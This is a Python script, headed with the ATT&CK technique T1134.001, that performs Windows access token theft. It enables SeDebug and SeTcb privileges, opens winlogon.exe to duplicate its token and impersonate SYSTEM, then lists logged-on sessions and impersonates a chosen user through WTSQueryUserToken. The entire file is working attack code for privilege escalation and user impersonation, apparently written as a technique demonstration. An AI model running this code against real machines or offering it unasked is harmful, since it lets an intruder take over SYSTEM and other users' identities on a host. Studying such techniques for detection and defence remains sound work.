'''
T1134.001 - Access Token Manipulation: Token Impersonation/Theft
'''

import ctypes 
from ctypes import wintypes as w 
import win32security
import win32ts
import win32con
import win32api

def get_error():
    error_code = kernel32.GetLastError()
    return(error_code)

def get_privilege(priv_name):
    current_process = kernel32.GetCurrentProcess()
    htoken = win32security.OpenProcessToken(current_process, win32con.TOKEN_QUERY | win32con.TOKEN_ADJUST_PRIVILEGES)
    priv_id = win32security.LookupPrivilegeValue(None, priv_name)
    win32security.AdjustTokenPrivileges(htoken, False, [(priv_id, win32con.SE_PRIVILEGE_ENABLED)])
    if get_error() == 0:
        print(f"{priv_name} Enabled")

def get_username():
    username = win32api.GetUserName()
    return username

def impersonate_user(token):
    win32security.ImpersonateLoggedOnUser(token)
    if get_error() == 0:
        print("User Impersonated Successfully")

#kernel
kernel32 = ctypes.windll.kernel32

#TH32CS_SNAPPROCESS - include all processes in the snapshot 
TH32CS_SNAPPROCESS = 0x00000002

#define PROCESSENTRY32W structure
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [("dwSize", w.DWORD),
                ("cntUsage", w.DWORD),
                ("th32ProcessID", w.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", w.DWORD),
                ("cntThreads", w.DWORD),
                ("th32ParentProcessID", w.DWORD),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", w.DWORD),
                ("szExeFile", ctypes.c_wchar * 260)]

#initilize process entry
process_entry = PROCESSENTRY32W()
process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)

#create snapshot, process id=0 for current process
snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
if get_error() == 0:
    print("Snapshot Created Successfully")

#get winlogon.exe
while kernel32.Process32NextW(snapshot, ctypes.byref(process_entry)) != 0:
    if (process_entry.szExeFile) == "winlogon.exe":
        winlogon_pid = process_entry.th32ProcessID

#impersonate SYSTEM
#open winlogon process with PROCESS_ALL_ACCESS and get winlogon token 
#need SeDebug to do it
get_privilege(win32con.SE_DEBUG_NAME)
winlogon_handle = kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, winlogon_pid)
if get_error() == 0:
    print("Winlogon Porocess Opened Successfully")

winlogon_token = win32security.OpenProcessToken(winlogon_handle, win32con.TOKEN_QUERY | win32con.TOKEN_DUPLICATE)
if get_error() == 0:
    print("Winlogon Token Retrieved Successfully")

#use winlogon token to impersonate SYSTEM 
impersonate_user(winlogon_token)
#check username
get_username()

#enum sessions to query token based on session, need SeTCb to do it
get_privilege(win32con.SE_TCB_NAME)

#open handle to server
server = win32ts.WTSOpenServer("localhost")

#enum active sessions
level = 1 #more details
sessions = win32ts.WTSEnumerateSessions(server, level)
print(f"Sessions: {sessions}")

#close server handle
kernel32.CloseHandle(server)

#session id 
session_id = int(input("Pick session >>>"))

#token for logged-on user specified by session id 
user_token = win32ts.WTSQueryUserToken(session_id)

#impersonate user 
impersonate_user(user_token)
get_username()

#close handles 
kernel32.CloseHandle(snapshot)
kernel32.CloseHandle(winlogon_handle)